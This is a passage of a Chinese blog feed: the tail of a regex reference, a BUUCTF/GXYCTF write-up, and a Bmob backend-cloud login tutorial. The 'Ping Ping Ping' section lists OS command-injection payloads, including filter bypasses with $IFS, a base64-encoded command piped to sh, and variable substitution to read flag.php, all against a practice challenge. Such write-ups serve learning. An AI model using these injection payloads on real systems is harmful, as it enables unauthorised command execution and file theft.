。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-null"><code>\0</code></a></td><td align="left">匹配 NULL（U+0000）字符， 不要在这后面跟其它小数，因为 <code>\0&lt;digits&gt;</code> 是一个八进制转义序列。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-hex-escape"><code>\xhh</code></a></td><td align="left">匹配一个两位十六进制数（\x00-\xFF）表示的字符。</td></tr><tr><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-unicode-escape"><code>\uhhhh</code></a></td><td align="left">匹配一个四位十六进制数表示的 UTF-16 代码单元。</td></tr><tr><td align="left"><code>\u&#123;hhhh&#125;或\u&#123;hhhhh&#125;</code></td><td align="left">（仅当设置了u标志时）匹配一个十六进制数表示的 Unicode 字符。</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;欢迎来到正则表达式。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="Web" scheme="http://favorhau.github.io/tags/Web/"/>
    
    <category term="正则匹配" scheme="http://favorhau.github.io/tags/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/"/>
    
  </entry>
  
  <entry>
    <title>20201226学习日记-BUUCTF小体验</title>
    <link href="http://favorhau.github.io/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/"/>
    <id>http://favorhau.github.io/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/</id>
    <published>2020-12-26T15:19:45.000Z</published>
    <updated>2020-12-26T16:18:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>顺便来了一波水题,发现不懂的领域</p><span id="more"></span><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><a href="https://imgchr.com/i/r4N9d1"><img src="https://s3.ax1x.com/2020/12/26/r4N9d1.png" alt="r4N9d1.png"></a></p><h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>先查看一波源代码，发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因此去<code>secrect.pnp</code>看看</p><h2 id="修改Referer"><a href="#修改Referer" class="headerlink" title="修改Referer"></a>修改Referer</h2><p><a href="https://imgchr.com/i/r4NBWT"><img src="https://s3.ax1x.com/2020/12/26/r4NBWT.png" alt="r4NBWT.png"></a><br>看样子后面会出现UA等老套路了</p><h2 id="修改UA"><a href="#修改UA" class="headerlink" title="修改UA"></a>修改UA</h2><p>果然出现了UA的修改，需要修改成对应的UA</p><h2 id="修改X-Forwarded-For"><a href="#修改X-Forwarded-For" class="headerlink" title="修改X-Forwarded-For"></a>修改X-Forwarded-For</h2><p>比起<code>burp suite</code> 这些我更想用<code>fidder</code>。<br><a href="https://imgchr.com/i/r46zOP"><img src="https://s3.ax1x.com/2020/12/26/r46zOP.png" alt="r46zOP.png"></a><br>最后得到flag。</p><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>看了题目<code>/?ip=</code>直接傻眼（逃），顶多看得懂其中有一个参数<code>ip</code>，但接下来手足无措。跑去查了题解，梳理了一下。</p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p><em>下面内容来源：<a href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></em></p><h3 id="0、命令联合执行"><a href="#0、命令联合执行" class="headerlink" title="0、命令联合执行"></a>0、命令联合执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure><h3 id="1、命令绕过空格方法有："><a href="#1、命令绕过空格方法有：" class="headerlink" title="1、命令绕过空格方法有："></a>1、命令绕过空格方法有：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">1</span> //$<span class="number">1</span>改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%<span class="number">20</span>   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;$X       （\x09表示tab，也可以用\x20）</span><br><span class="line"><span class="number">123456789101112</span></span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure><h3 id="2、内联执行"><a href="#2、内联执行" class="headerlink" title="2、内联执行"></a>2、内联执行</h3><p>内联，就是将反引号内命令的输出作为输入执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>梳理了CSDN网友的思路，总结一下</p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>用 <code>|</code> 或者<code>;</code>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure><blockquote><p>/?ip=<br>PING 127.0.0.1 (127.0.0.1): 56 data bytes<br>flag.php<br>index.php</p></blockquote><h3 id="判断过滤字符"><a href="#判断过滤字符" class="headerlink" title="判断过滤字符"></a>判断过滤字符</h3><p>滤了空格和标点，flag等符号，不能直接cat flag</p><p><code>cat flag</code>是何方神圣呢？<a href="https://www.runoob.com/linux/linux-comm-cat.html">cat命令传送门</a></p><blockquote><p>/?ip= fxck your space!</p></blockquote><p>过滤了空格，用<code>$&#123;IFS&#125;$</code>代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php </span><br></pre></td></tr></table></figure><blockquote><p>fxck your symbol! 过滤{} </p></blockquote><p>也过滤了{}，用<code>$IFS$1</code>代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1flag.php</span><br></pre></td></tr></table></figure><blockquote><p>/?ip= fxck your flag!</p></blockquote><p>不读flag，读index</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure><blockquote><p>/?ip=<br>PING 127.0.0.1 (127.0.0.1): 56 data bytes<br>/?ip=<br>|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match)){<br>    echo preg_match(“/&amp;|/|?|*|&lt;|[\x{00}-\x{20}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match);<br>    die(“fxck your symbol!”);<br>  } else if(preg_match(“/ /“, $ip)){<br>    die(“fxck your space!”);<br>  } else if(preg_match(“/bash/“, $ip)){<br>    die(“fxck your bash!”);<br>  } else if(preg_match(“/.*f.*l.*a.<em>g.</em>/“, $ip)){<br>    die(“fxck your flag!”);<br>  }<br>  $a = shell_exec(“ping -c 4 “.$ip);<br>  echo “<br>“;<br>  print_r($a);<br>}</p><p>?&gt;</p></blockquote><p>一目了然过滤了啥，flag字眼也过滤了，bash也没了，不过sh没过滤：</p><ul><li>总结：过滤的特殊字符：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;<span class="built_in">echo</span>$IFS<span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64$IFS<span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure><p><em>Y2F0IGZsYWcucGhw是cat flag.php的base64-encode</em><br><em>此payload只是其中的一个</em><br>除此之外还有形如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla<span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure><p>不难看出通过<code>变量替换</code>绕过了过滤。</p><p>然后查看源代码得flag</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>本篇大部分使用了</p><p><a href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p><p>的内容，由于CTF思路确实需要参考。</p><p>在后面挂一个很好的命令提示符漏洞绕过与执行的博客总结</p><p><a href="https://www.ghtwf01.cn/index.php/archives/273/">https://www.ghtwf01.cn/index.php/archives/273/</a></p><p><del>学会绕过过滤的路还有好长的样子</del></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;顺便来了一波水题,发现不懂的领域&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="BUUCTF" scheme="http://favorhau.github.io/tags/BUUCTF/"/>
    
    <category term="Web" scheme="http://favorhau.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>后端云，YES！</title>
    <link href="http://favorhau.github.io/2020/12/26/%E5%90%8E%E7%AB%AF%E4%BA%91%EF%BC%8CYES%EF%BC%81/"/>
    <id>http://favorhau.github.io/2020/12/26/%E5%90%8E%E7%AB%AF%E4%BA%91%EF%BC%8CYES%EF%BC%81/</id>
    <published>2020-12-26T04:19:45.000Z</published>
    <updated>2020-12-26T10:01:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>随着后端的完善，许多后端云服务浮起水面</p><span id="more"></span><p>前面写到简单的用户注册登录功能，其实这时候会想–<em>有没有一个集成的用户接口，供我们调用，而省去了一系列的功能呢？</em><br>后端云的功能包括有云函数、短信验证码、数据储存等功能，可以理解为一个”大后端“，<br>常有的后端云服务提供商有bmob、leancloud等。<br><del>突然想起前面写到过尚未完工的登录注册功能，所以继续来探究数据储存（登录注册）的功能</del></p><h1 id="文件的引入"><a href="#文件的引入" class="headerlink" title="文件的引入"></a>文件的引入</h1><p>Bmob的JavaScript SDK基于<code>Backbone.js</code>框架开发，在使用过程中除<code>Bmob.view</code>类需要提供jQuery或者类似JQuery的<code>$</code>方法外，不需要再引入其他类库。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;Bmob-2.2.5.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在这里下载了bomb最新的sdk。</p><h1 id="控制台测试"><a href="#控制台测试" class="headerlink" title="控制台测试"></a>控制台测试</h1><p>通过控制台测试查看返回值。</p><h2 id="新建一个用户"><a href="#新建一个用户" class="headerlink" title="新建一个用户"></a>新建一个用户</h2><p>先新建一个用户，用户名为<code>admin</code>密码为<code>admin</code>。<br><a href="https://imgchr.com/i/rhsyxP"><img src="https://s3.ax1x.com/2020/12/26/rhsyxP.png" alt="rhsyxP.png"></a></p><h2 id="查看返回值"><a href="#查看返回值" class="headerlink" title="查看返回值"></a>查看返回值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bmob.User.login(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(res)</span><br><span class="line"> &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>根据文档在JavaScript下添加如上代码。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;createdAt: <span class="string">&quot;2020-12-26 15:10:29&quot;</span>, objectId: <span class="string">&quot;49n3GGGL&quot;</span>, sessionToken: <span class="string">&quot;f6f05579407b5e518048c32884f566f0&quot;</span>, updatedAt: <span class="string">&quot;2020-12-26 15:13:48&quot;</span>, username: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">createdAt: <span class="string">&quot;2020-12-26 15:10:29&quot;</span></span><br><span class="line">objectId: <span class="string">&quot;49n3GGGL&quot;</span></span><br><span class="line">sessionToken: <span class="string">&quot;f6f05579407b5e518048c32884f566f0&quot;</span></span><br><span class="line">updatedAt: <span class="string">&quot;2020-12-26 15:13:48&quot;</span></span><br><span class="line">username: <span class="string">&quot;admin&quot;</span></span><br><span class="line">__proto__: Object</span><br></pre></td></tr></table></figure><p>得到以上的返回结果：登录成功。<br>此时回想起前面的mysql，感觉后端云还是挺棒的。</p><h1 id="基础表单设定"><a href="#基础表单设定" class="headerlink" title="基础表单设定"></a>基础表单设定</h1><p>需要完成用户的注册、登录以及美化，才算是一个相对完整的登录注册表单（吧）。</p><h2 id="引入前端框架"><a href="#引入前端框架" class="headerlink" title="引入前端框架"></a>引入前端框架</h2><p>emmm，我们看到过许多HTML5沉浸式的前端登录表单，<del>由于功底不足，先找一些开源的表单样式</del>。感觉这样的还不需动用到Github，直接去源码之家找一个就好。</p><p><a href="https://imgchr.com/i/rhcDPJ"><img src="https://s3.ax1x.com/2020/12/26/rhcDPJ.png" alt="rhcDPJ.png"></a></p><p>很<code>可</code>!<br>附上出处：<a href="https://tj.mycodes.net/202011/denglukuangqiehuan.zip">https://tj.mycodes.net/202011/denglukuangqiehuan.zip</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>后端云用户注册登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--前端样式来源：源码之家--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--图标库--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&#x27;stylesheet&#x27;</span> <span class="attr">href</span>=<span class="string">&#x27;css/font-awesome.min.css&#x27;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--核心样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card alt&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;toggle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>会员注册</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;close&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;#&#123;type&#125;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;#&#123;label&#125;&quot;</span>&gt;</span>确认密码<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>提交注册<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;js/jquery.min.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个非常好的前端源码，那么问题来了？如何与后端配合完成用户注册登录的功能呢？</p><h2 id="引入JavaScript-SDK"><a href="#引入JavaScript-SDK" class="headerlink" title="引入JavaScript SDK"></a>引入JavaScript SDK</h2><p>引入此段代码，将<code>Bmob-2.2.5.min.js</code>并入<code>js</code>文件夹中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;js/Bmob-2.2.5.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在<code>script.js</code>中添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bmob.initialize(<span class="string">&quot;1c30ea567*******&quot;</span>,<span class="string">&quot;*****&quot;</span>);<span class="comment">//分别为secret key和安全密码</span></span><br></pre></td></tr></table></figure><h2 